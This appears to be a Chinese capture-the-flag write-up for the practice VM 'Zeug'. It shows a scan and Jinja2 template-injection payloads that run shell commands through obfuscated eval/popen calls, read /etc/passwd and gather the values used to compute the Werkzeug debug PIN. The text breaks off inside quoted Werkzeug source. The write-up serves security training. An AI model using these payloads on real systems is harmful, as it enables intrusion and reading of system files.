# Zeug

:::note

[Linux VM] [Tested on VirtualBox] created by || c4rta

⏲️ Release Date // 2024-02-05

✔️ MD5 // 6c34801ea5de49d8f7c5ff71c818e6f2

☠ Root // 4

💀 User // 4

📝Notes //
Enjoy it, you can do it :D

:::

## 靶机启动

靶机 IP：

```plaintext
192.168.56.122
```

## nmap 信息扫描

```plaintext
Nmap scan report for 192.168.56.122 (192.168.56.122)
Host is up (0.00036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             109 Jan 06 23:14 README.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.11.2
|     Date: Tue, 06 Feb 2024 02:13:47 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 549
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Zeug</title>
|     <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
|     </head>
|     <body>
|     <h1>Zeug</h1>
|     <h3>Rendering HTML templates</h3>
|     <form action="/" method="post" enctype="multipart/form-data">
|     <input type="file" name="file" accept=".html" title="Select file" required>
|     <input type="submit" value="Upload">
|     </form>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.11.2
|     Date: Tue, 06 Feb 2024 02:14:02 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: POST, GET, OPTIONS, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

## ftp Anonymous

```plaintext
Hi, Cosette, don't forget to disable the debug mode in the web application, we don't want security breaches.
```

根据指纹信息，猜测为 Python Werkzeug 框架的 Debug 功能

```plaintext
http://192.168.56.122:5000/console
```

此路劲确实存在 Python Werkzeug Debug Console

## Python Werkzeug Debug Console

尝试路径扫描，未发现有价值信息

Console 界面无法直接突破

### SSTI 构建攻击 exp

存在 SSTI 注入

```plaintext title="{{7+7}}"
14
```

```plaintext title="{{config.items()}}"
dict_items([('DEBUG', True), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])
```

```plaintext title="{{lipsum.__globals__}}"
{'__name__': 'jinja2.utils', '__doc__': None, '__package__': 'jinja2', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7facccf95f10>, '__spec__': ModuleSpec(name='jinja2.utils', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7facccf95f10>, origin='/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/utils.py'), '__file__': '/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/utils.py', '__cached__': '/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/__pycache__/utils.cpython-311.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...'in slices.", '__package__': '','__loader__': <class'_frozen_importlib.BuiltinImporter'>,'__spec__': ModuleSpec(name='builtins', loader=<class'_frozen_importlib.BuiltinImporter'>, origin='built-in'),'__build_class__': <built-in function __build_class__>,'__import__': <built-in function __import__>,'abs': <built-in function abs>,'all': <built-in function all>,'any': <built-in function any>,'ascii': <built-in function ascii>,'bin': <built-in function bin>,'breakpoint': <built-in function breakpoint>,'callable': <built-in function callable>,'chr': <built-in function chr>,'compile': <built-in function compile>,'delattr': <built-in function delattr>,'dir': <built-in function dir>,'divmod': <built-in function divmod>,'eval': <built-in function eval>,'exec': <built-in function exec>,'format': <built-in function format>,'getattr': <built-in function getattr>,'globals': <built-in function globals>,'hasattr': <built-in function hasattr>,'hash': <built-in function hash>,'hex': <built-in function hex>,'id': <built-in function id>,'input': <built-in function input>,'isinstance': <built-in function isinstance>,'issubclass': <built-in function issubclass>,'iter': <built-in function iter>,'aiter': <built-in function aiter>,'len': <built-in function len>,'locals': <built-in function locals>,'max': <built-in function max>,'min': <built-in function min>,'next': <built-in function next>,'anext': <built-in function anext>,'oct': <built-in function oct>,'ord': <built-in function ord>,'pow': <built-in function pow>,'print': <built-in function print>,'repr': <built-in function repr>,'round': <built-in function round>,'setattr': <built-in function setattr>,'sorted': <built-in function sorted>,'sum': <built-in function sum>,'vars': <built-in function vars>,'None': None,'Ellipsis': Ellipsis,'NotImplemented': NotImplemented,'False': False,'True': True,'bool': <class'bool'>,'memoryview': <class'memoryview'>,'bytearray': <class'bytearray'>,'bytes': <class'bytes'>,'classmethod': <class'classmethod'>,'complex': <class'complex'>,'dict': <class'dict'>,'enumerate': <class'enumerate'>,'filter': <class'filter'>,'float': <class'float'>,'frozenset': <class'frozenset'>,'property': <class'property'>,'int': <class'int'>,'list': <class'list'>,'map': <class'map'>,'object': <class'object'>,'range': <class'range'>,'reversed': <class'reversed'>,'set': <class'set'>,'slice': <class'slice'>,'staticmethod': <class'staticmethod'>,'str': <class'str'>,'super': <class'super'>,'tuple': <class'tuple'>,'type': <class'type'>,'zip': <class'zip'>,'__debug__': True,'BaseException': <class'BaseException'>,'BaseExceptionGroup': <class'BaseExceptionGroup'>,'Exception': <class'Exception'>,'GeneratorExit': <class'GeneratorExit'>,'KeyboardInterrupt': <class'KeyboardInterrupt'>,'SystemExit': <class'SystemExit'>,'ArithmeticError': <class'ArithmeticError'>,'AssertionError': <class'AssertionError'>,'AttributeError': <class'AttributeError'>,'BufferError': <class'BufferError'>,'EOFError': <class'EOFError'>,'ImportError': <class'ImportError'>,'LookupError': <class'LookupError'>,'MemoryError': <class'MemoryError'>,'NameError': <class'NameError'>,'OSError': <class'OSError'>,'ReferenceError': <class'ReferenceError'>,'RuntimeError': <class'RuntimeError'>,'StopAsyncIteration': <class'StopAsyncIteration'>,'StopIteration': <class'StopIteration'>,'SyntaxError': <class'SyntaxError'>,'SystemError': <class'SystemError'>,'TypeError': <class'TypeError'>,'ValueError': <class'ValueError'>,'Warning': <class'Warning'>,'FloatingPointError': <class'FloatingPointError'>,'OverflowError': <class'OverflowError'>,'ZeroDivisionError': <class'ZeroDivisionError'>,'BytesWarning': <class'BytesWarning'>,'DeprecationWarning': <class'DeprecationWarning'>,'EncodingWarning': <class'EncodingWarning'>,'FutureWarning': <class'FutureWarning'>,'ImportWarning': <class'ImportWarning'>,'PendingDeprecationWarning': <class'PendingDeprecationWarning'>,'ResourceWarning': <class'ResourceWarning'>,'RuntimeWarning': <class'RuntimeWarning'>,'SyntaxWarning': <class'SyntaxWarning'>,'UnicodeWarning': <class'UnicodeWarning'>,'UserWarning': <class'UserWarning'>,'BlockingIOError': <class'BlockingIOError'>,'ChildProcessError': <class'ChildProcessError'>,'ConnectionError': <class'ConnectionError'>,'FileExistsError': <class'FileExistsError'>,'FileNotFoundError': <class'FileNotFoundError'>,'InterruptedError': <class'InterruptedError'>,'IsADirectoryError': <class'IsADirectoryError'>,'NotADirectoryError': <class'NotADirectoryError'>,'PermissionError': <class'PermissionError'>,'ProcessLookupError': <class'ProcessLookupError'>,'TimeoutError': <class'TimeoutError'>,'IndentationError': <class'IndentationError'>,'IndexError': <class'IndexError'>,'KeyError': <class'KeyError'>,'ModuleNotFoundError': <class'ModuleNotFoundError'>,'NotImplementedError': <class'NotImplementedError'>,'RecursionError': <class'RecursionError'>,'UnboundLocalError': <class'UnboundLocalError'>,'UnicodeError': <class'UnicodeError'>,'BrokenPipeError': <class'BrokenPipeError'>,'ConnectionAbortedError': <class'ConnectionAbortedError'>,'ConnectionRefusedError': <class'ConnectionRefusedError'>,'ConnectionResetError': <class'ConnectionResetError'>,'TabError': <class'TabError'>,'UnicodeDecodeError': <class'UnicodeDecodeError'>,'UnicodeEncodeError': <class'UnicodeEncodeError'>,'UnicodeTranslateError': <class'UnicodeTranslateError'>,'ExceptionGroup': <class'ExceptionGroup'>,'EnvironmentError': <class'OSError'>,'IOError': <class'OSError'>,'open': <built-in function open>,'quit': Use quit() or Ctrl-D (i.e. EOF) to exit,'exit': Use exit() or Ctrl-D (i.e. EOF) to exit,'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved.,'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information.,'license': Type license() to see the full license text,'help': Type help() for interactive help, or help(object) for help about object.},'__annotations__': {'missing': typing.Any,'internal_code': typing.MutableSet[code]},'enum': <module'enum'from'/usr/lib/python3.11/enum.py'>,'json': <module'json'from'/usr/lib/python3.11/json/__init__.py'>,'os': <module'os'(frozen)>,'re': <module're'from'/usr/lib/python3.11/re/__init__.py'>,'t': <module'typing'from'/usr/lib/python3.11/typing.py'>,'abc': <module'collections.abc'from'/usr/lib/python3.11/collections/abc.py'>,'deque': <class'collections.deque'>,'choice': <bound method Random.choice of <random.Random object at 0x17aedb0>>,'randrange': <bound method Random.randrange of <random.Random object at 0x17aedb0>>,'Lock': <built-in function allocate_lock>,'CodeType': <class'code'>,'quote_from_bytes': <function quote_from_bytes at 0x7faccdd60a40>,'markupsafe': <module'markupsafe'from'/home/cosette/zeug/venv/lib/python3.11/site-packages/markupsafe/__init__.py'>,'F': ~F,'missing': missing,'internal_code': {<code object __call__ at 0x7facccfc2500, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py", line 566>, <code object call at 0x1a4eb60, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py", line 260>, <code object __getattr__ at 0x7facccf62d30, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py", line 854>, <code object parse at 0x7faccd145570, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py", line 593>, <code object get_or_select_template at 0x7facccf5cc30, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py", line 1066>, <code object load at 0x7facccff2030, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/loaders.py", line 107>, <code object select_template at 0x1ac9ec0, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py", line 1012>, <code object load at 0x7faccce883f0, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/loaders.py", line 563>, <code object _get_default_module at 0x7facccf90030, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py", line 1423>, <code object compile at 0x7faccd1a2b50, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py", line 728>, <code object _load_template at 0x1aed470, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py", line 950>, <code object load at 0x1ae8ad0, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/loaders.py", line 635>, <code object __call__ at 0x7faccd243b40, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py", line 374>, <code object _fail_with_undefined_error at 0x7facccfb32d0, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py", line 845>, <code object __call__ at 0x1b31a70, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py", line 687>, <code object _async_call at 0x7facccf5ea30, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py", line 363>, <code object get_template at 0x7faccd0b2a30, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py", line 975>, <code object load at 0x7faccd13fb50, file"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/loaders.py", line 513>},'concat': <built-in method join of str object at 0xa60e40>,'pass_context': <function pass_context at 0x7facccfa0400>,'pass_eval_context': <function pass_eval_context at 0x7facccfa0680>,'pass_environment': <function pass_environment at 0x7facccfa0720>,'_PassArg': <enum'_PassArg'>,'internalcode': <function internalcode at 0x7facccfa0900>,'is_undefined': <function is_undefined at 0x7facccfa0ae0>,'consume': <function consume at 0x7facccfa0b80>,'clear_caches': <function clear_caches at 0x7facccfa0c20>,'import_string': <function import_string at 0x7facccfa0cc0>,'open_if_exists': <function open_if_exists at 0x7facccfa0d60>,'object_type_repr': <function object_type_repr at 0x7facccfa0e00>,'pformat': <function pformat at 0x7facccfa0ea0>,'_http_re': re.compile('\n ^\n (\n (https?://|www\\.) # scheme or www\n (([\\w%-]+\\.)+)? # subdomain\n (\n [a-z]{2,63} # basic tld\n |\n xn--[\\w%]{2,59} # idna t, re.IGNORECASE|re.VERBOSE), '_email_re': re.compile('^\\S+@\\w[\\w.-]*\\.\\w+$'), 'urlize': <function urlize at 0x7facccfa0f40>, 'generate_lorem_ipsum': <function generate_lorem_ipsum at 0x7facccfa0fe0>, 'url_quote': <function url_quote at 0x7facccfa1080>, 'LRUCache': <class 'jinja2.utils.LRUCache'>, 'select_autoescape': <function select_autoescape at 0x7facccfa1120>, 'htmlsafe_json_dumps': <function htmlsafe_json_dumps at 0x7facccfa1e40>, 'Cycler': <class 'jinja2.utils.Cycler'>, 'Joiner': <class 'jinja2.utils.Joiner'>, 'Namespace': <class 'jinja2.utils.Namespace'>}
```

```plaintext title="{{lipsum.__globals__.__builtins__}}"
{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...'in slices.", '__package__': '','__loader__': <class'_frozen_importlib.BuiltinImporter'>,'__spec__': ModuleSpec(name='builtins', loader=<class'_frozen_importlib.BuiltinImporter'>, origin='built-in'),'__build_class__': <built-in function __build_class__>,'__import__': <built-in function __import__>,'abs': <built-in function abs>,'all': <built-in function all>,'any': <built-in function any>,'ascii': <built-in function ascii>,'bin': <built-in function bin>,'breakpoint': <built-in function breakpoint>,'callable': <built-in function callable>,'chr': <built-in function chr>,'compile': <built-in function compile>,'delattr': <built-in function delattr>,'dir': <built-in function dir>,'divmod': <built-in function divmod>,'eval': <built-in function eval>,'exec': <built-in function exec>,'format': <built-in function format>,'getattr': <built-in function getattr>,'globals': <built-in function globals>,'hasattr': <built-in function hasattr>,'hash': <built-in function hash>,'hex': <built-in function hex>,'id': <built-in function id>,'input': <built-in function input>,'isinstance': <built-in function isinstance>,'issubclass': <built-in function issubclass>,'iter': <built-in function iter>,'aiter': <built-in function aiter>,'len': <built-in function len>,'locals': <built-in function locals>,'max': <built-in function max>,'min': <built-in function min>,'next': <built-in function next>,'anext': <built-in function anext>,'oct': <built-in function oct>,'ord': <built-in function ord>,'pow': <built-in function pow>,'print': <built-in function print>,'repr': <built-in function repr>,'round': <built-in function round>,'setattr': <built-in function setattr>,'sorted': <built-in function sorted>,'sum': <built-in function sum>,'vars': <built-in function vars>,'None': None,'Ellipsis': Ellipsis,'NotImplemented': NotImplemented,'False': False,'True': True,'bool': <class'bool'>,'memoryview': <class'memoryview'>,'bytearray': <class'bytearray'>,'bytes': <class'bytes'>,'classmethod': <class'classmethod'>,'complex': <class'complex'>,'dict': <class'dict'>,'enumerate': <class'enumerate'>,'filter': <class'filter'>,'float': <class'float'>,'frozenset': <class'frozenset'>,'property': <class'property'>,'int': <class'int'>,'list': <class'list'>,'map': <class'map'>,'object': <class'object'>,'range': <class'range'>,'reversed': <class'reversed'>,'set': <class'set'>,'slice': <class'slice'>,'staticmethod': <class'staticmethod'>,'str': <class'str'>,'super': <class'super'>,'tuple': <class'tuple'>,'type': <class'type'>,'zip': <class'zip'>,'__debug__': True,'BaseException': <class'BaseException'>,'BaseExceptionGroup': <class'BaseExceptionGroup'>,'Exception': <class'Exception'>,'GeneratorExit': <class'GeneratorExit'>,'KeyboardInterrupt': <class'KeyboardInterrupt'>,'SystemExit': <class'SystemExit'>,'ArithmeticError': <class'ArithmeticError'>,'AssertionError': <class'AssertionError'>,'AttributeError': <class'AttributeError'>,'BufferError': <class'BufferError'>,'EOFError': <class'EOFError'>,'ImportError': <class'ImportError'>,'LookupError': <class'LookupError'>,'MemoryError': <class'MemoryError'>,'NameError': <class'NameError'>,'OSError': <class'OSError'>,'ReferenceError': <class'ReferenceError'>,'RuntimeError': <class'RuntimeError'>,'StopAsyncIteration': <class'StopAsyncIteration'>,'StopIteration': <class'StopIteration'>,'SyntaxError': <class'SyntaxError'>,'SystemError': <class'SystemError'>,'TypeError': <class'TypeError'>,'ValueError': <class'ValueError'>,'Warning': <class'Warning'>,'FloatingPointError': <class'FloatingPointError'>,'OverflowError': <class'OverflowError'>,'ZeroDivisionError': <class'ZeroDivisionError'>,'BytesWarning': <class'BytesWarning'>,'DeprecationWarning': <class'DeprecationWarning'>,'EncodingWarning': <class'EncodingWarning'>,'FutureWarning': <class'FutureWarning'>,'ImportWarning': <class'ImportWarning'>,'PendingDeprecationWarning': <class'PendingDeprecationWarning'>,'ResourceWarning': <class'ResourceWarning'>,'RuntimeWarning': <class'RuntimeWarning'>,'SyntaxWarning': <class'SyntaxWarning'>,'UnicodeWarning': <class'UnicodeWarning'>,'UserWarning': <class'UserWarning'>,'BlockingIOError': <class'BlockingIOError'>,'ChildProcessError': <class'ChildProcessError'>,'ConnectionError': <class'ConnectionError'>,'FileExistsError': <class'FileExistsError'>,'FileNotFoundError': <class'FileNotFoundError'>,'InterruptedError': <class'InterruptedError'>,'IsADirectoryError': <class'IsADirectoryError'>,'NotADirectoryError': <class'NotADirectoryError'>,'PermissionError': <class'PermissionError'>,'ProcessLookupError': <class'ProcessLookupError'>,'TimeoutError': <class'TimeoutError'>,'IndentationError': <class'IndentationError'>,'IndexError': <class'IndexError'>,'KeyError': <class'KeyError'>,'ModuleNotFoundError': <class'ModuleNotFoundError'>,'NotImplementedError': <class'NotImplementedError'>,'RecursionError': <class'RecursionError'>,'UnboundLocalError': <class'UnboundLocalError'>,'UnicodeError': <class'UnicodeError'>,'BrokenPipeError': <class'BrokenPipeError'>,'ConnectionAbortedError': <class'ConnectionAbortedError'>,'ConnectionRefusedError': <class'ConnectionRefusedError'>,'ConnectionResetError': <class'ConnectionResetError'>,'TabError': <class'TabError'>,'UnicodeDecodeError': <class'UnicodeDecodeError'>,'UnicodeEncodeError': <class'UnicodeEncodeError'>,'UnicodeTranslateError': <class'UnicodeTranslateError'>,'ExceptionGroup': <class'ExceptionGroup'>,'EnvironmentError': <class'OSError'>,'IOError': <class'OSError'>,'open': <built-in function open>,'quit': Use quit() or Ctrl-D (i.e. EOF) to exit,'exit': Use exit() or Ctrl-D (i.e. EOF) to exit,'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved.,'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information.,'license': Type license() to see the full license text,'help': Type help() for interactive help, or help(object) for help about object.}
```

```plaintext title="/etc/passwd"
# {{lipsum.__globals__.__builtins__.open("/etc/passwd").read()}}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing
List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd
Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
cosette:x:1001:1001::/home/cosette:/bin/bash
exia:x:1002:1002::/home/exia:/bin/bash
ftp:x:103:112:ftp
daemon,,,:/srv/ftp:/usr/sbin/nologin
```

```plaintext title="ls /"
# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"ls -lh /\").read()")}}
total 60K
lrwxrwxrwx 1 root root 7 Jan 6 12:09 bin -> usr/bin
drwxr-xr-x 3 root root 4.0K Jan 6 13:50 boot
drwxr-xr-x 17 root root 3.3K Feb 6 02:39 dev
drwxr-xr-x 70 root root 4.0K Jan 7 13:13 etc
drwxr-xr-x 4 root root 4.0K Jan 6 19:28 home
lrwxrwxrwx 1 root root 30 Jan 6 13:28 initrd.img -> boot/initrd.img-6.1.0-17-amd64
lrwxrwxrwx 1 root root 30 Jan 6 13:01 initrd.img.old -> boot/initrd.img-6.1.0-15-amd64
lrwxrwxrwx 1 root root 7 Jan 6 12:09 lib -> usr/lib
lrwxrwxrwx 1 root root 9 Jan 6 12:09 lib64 -> usr/lib64
drwx------ 2 root root 16K Jan 6 12:09 lost+found
drwxr-xr-x 3 root root 4.0K Jan 6 12:09 media
drwxr-xr-x 2 root root 4.0K Jan 6 12:09 mnt
drwxr-xr-x 2 root root 4.0K Jan 6 23:29 opt
dr-xr-xr-x 127 root root 0 Feb 6 02:39 proc
drwx------ 4 root root 4.0K Jan 6 23:52 root
drwxr-xr-x 18 root root 500 Feb 6 02:39 run
lrwxrwxrwx 1 root root 8 Jan 6 12:09 sbin -> usr/sbin
drwxr-xr-x 3 root root 4.0K Jan 6 23:09 srv
dr-xr-xr-x 13 root root 0 Feb 6 02:39 sys
drwxrwxrwt 7 root root 4.0K Feb 6 02:39 tmp
drwxr-xr-x 12 root root 4.0K Jan 6 12:09 usr
drwxr-xr-x 12 root root 4.0K Jan 6 15:16 var
lrwxrwxrwx 1 root root 27 Jan 6 13:28 vmlinuz -> boot/vmlinuz-6.1.0-17-amd64
lrwxrwxrwx 1 root root 27 Jan 6 13:01 vmlinuz.old -> boot/vmlinuz-6.1.0-15-amd64
```

```plaintext title="ls -lh /home/cosette"
# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"ls -lh /home/co"+"sette\").read()")}}
total 20K
-rwx------ 1 cosette cosette 16K Jan 7 13:13 seed_bak
drwx------ 6 cosette cosette 4.0K Jan 7 09:54 zeug
```

```plaintext title="ls -lh /home/cosette/zeug"
# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"ls -lh /home/co"+"sette/zeug\").read()")}}
total 20K
-rwx------ 1 cosette cosette 2.5K Jan 7 09:54 app.py
drwx------ 2 cosette cosette 4.0K Jan 6 16:43 __pycache__
drwx------ 3 cosette cosette 4.0K Jan 6 15:30 static
drwx------ 2 cosette cosette 4.0K Jan 6 19:18 templates
drwx------ 5 cosette cosette 4.0K Jan 6 16:31 venv
```

### 读取环境信息

```plaintext title="ls -lh /sys/class/net/"
# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"ls -lh /sys/class/net/\").read()")}}
total 0
lrwxrwxrwx 1 root root 0 Feb 5 20:11 enp0s3 -> ../../devices/pci0000:00/0000:00:03.0/net/enp0s3
lrwxrwxrwx 1 root root 0 Feb 5 20:11 lo -> ../../devices/virtual/net/lo
```

获得计算 PIN 值需要的信息

```plaintext title="cat /sys/class/net/enp0s3/address"
# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"cat /sys/class/net/enp0s3/address\").read()")}}
08:00:27:05:3b:5c
```

```plaintext title="cat /proc/sys/kernel/random/boot_id"
# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"cat /proc/sys/kernel/random/boot_id\").read()")}}
7fc0efd5-5586-43eb-bef5-72b7b0a675b1
```

```plaintext title="cat /proc/self/cgroup"
# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"cat /proc/self/cgroup\").read()")}}
0::/system.slice/zeug-app.service
```

```plaintext title="ls -lh /home/cosette/zeug/venv"
total 16K
drwx------ 2 cosette cosette 4.0K Jan 6 16:48 bin
drwx------ 3 cosette cosette 4.0K Jan 6 16:31 include
drwx------ 3 cosette cosette 4.0K Jan 6 16:31 lib
lrwxrwxrwx 1 cosette cosette 3 Jan 6 16:31 lib64 -> lib
-rwx------ 1 cosette cosette 162 Jan 6 16:31 pyvenv.cfg
```

```plaintext title="ls -lh /home/cosette/zeug/venv/lib/python3.11/site-packages"
# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"ls -lh /home/co"+"sette/zeug/venv/lib/python3.11/site-packages\").read()")}}
total 144K
drwx------ 4 cosette cosette 4.0K Jan 6 16:50 bleach
drwx------ 2 cosette cosette 4.0K Jan 6 16:50 bleach-6.1.0.dist-info
drwx------ 3 cosette cosette 4.0K Jan 6 16:48 blinker
drwx------ 2 cosette cosette 4.0K Jan 6 16:48 blinker-1.7.0.dist-info
drwx------ 3 cosette cosette 4.0K Jan 6 16:48 click
drwx------ 2 cosette cosette 4.0K Jan 6 16:48 click-8.1.7.dist-info
drwx------ 3 cosette cosette 4.0K Jan 6 16:31 _distutils_hack
-rwx------ 1 cosette cosette 151 Jan 6 16:31 distutils-precedence.pth
drwx------ 5 cosette cosette 4.0K Jan 6 16:48 flask
drwx------ 2 cosette cosette 4.0K Jan 6 16:48 flask-3.0.0.dist-info
drwx------ 3 cosette cosette 4.0K Jan 6 16:48 itsdangerous
drwx------ 2 cosette cosette 4.0K Jan 6 16:48 itsdangerous-2.1.2.dist-info
drwx------ 3 cosette cosette 4.0K Jan 6 16:48 jinja2
drwx------ 2 cosette cosette 4.0K Jan 6 16:48 Jinja2-3.1.2.dist-info
drwx------ 3 cosette cosette 4.0K Jan 6 16:48 markupsafe
drwx------ 2 cosette cosette 4.0K Jan 6 16:48 MarkupSafe-2.1.3.dist-info
drwx------ 5 cosette cosette 4.0K Jan 6 16:31 pip
drwx------ 2 cosette cosette 4.0K Jan 6 16:31 pip-23.0.1.dist-info
drwx------ 5 cosette cosette 4.0K Jan 6 16:31 pkg_resources
drwx------ 2 cosette cosette 4.0K Jan 6 16:50 __pycache__
drwx------ 8 cosette cosette 4.0K Jan 6 16:31 setuptools
drwx------ 2 cosette cosette 4.0K Jan 6 16:31 setuptools-66.1.1.dist-info
drwx------ 2 cosette cosette 4.0K Jan 6 16:50 six-1.16.0.dist-info
-rwx------ 1 cosette cosette 34K Jan 6 16:50 six.py
drwx------ 3 cosette cosette 4.0K Jan 6 16:50 webencodings
drwx------ 2 cosette cosette 4.0K Jan 6 16:50 webencodings-0.5.1.dist-info
drwx------ 9 cosette cosette 4.0K Jan 6 16:48 werkzeug
drwx------ 2 cosette cosette 4.0K Jan 6 16:48 werkzeug-3.0.1.dist-info
```

可以得到相关的包的版本信息

| Package Name | Version |
| :----------: | :-----: |
|   werkzeug   |  3.0.1  |
|    Flask     |  3.0.0  |

<details>

<summary> werkzeug 3.0.1 PIN Code 计算部分的原始脚本 </summary>

```python
from __future__ import annotations

import getpass
import hashlib
import json
import os
import pkgutil
import re
import sys
import time
import typing as t
import uuid
from contextlib import ExitStack
from io import BytesIO
from itertools import chain
from os.path import basename
from os.path import join
from zlib import adler32

from .._internal import _log
from ..exceptions import NotFound
from ..http import parse_cookie
from ..security import gen_salt
from ..utils import send_file
from ..wrappers.request import Request
from ..wrappers.response import Response
from .console import Console
from .tbtools import DebugFrameSummary
from .tbtools import DebugTraceback
